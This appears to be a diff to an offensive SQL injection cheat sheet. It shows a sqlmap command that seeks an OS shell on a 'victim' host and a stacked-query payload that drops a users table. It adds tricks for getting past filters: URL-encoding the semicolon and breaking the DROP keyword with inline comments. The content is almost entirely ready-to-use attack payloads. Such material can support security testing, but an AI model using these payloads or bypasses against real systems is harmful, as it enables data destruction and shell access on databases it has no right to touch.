@@ -16,3 +16,28 @@ sqlmap -u "http://victim.com/page.php?id=1" -p id --technique=S --os-shell
 
 
 👉 Can sometimes get an OS shell if DB has permissions.
+
+
+------------------------------------------------------------------------------------------
+
+
+Stacked Queries
+
+Normal Payload:
+
+'; DROP TABLE users;--
+
+
+Bypass Tricks:
+
+Use semicolon encoding (%3B):
+
+'%3B DROP TABLE users--
+
+
+Break keyword with comments:
+
+'; DR/**/OP TABLE users--
+
+
+Use EXEC or DECLARE for MSSQL bypasses.
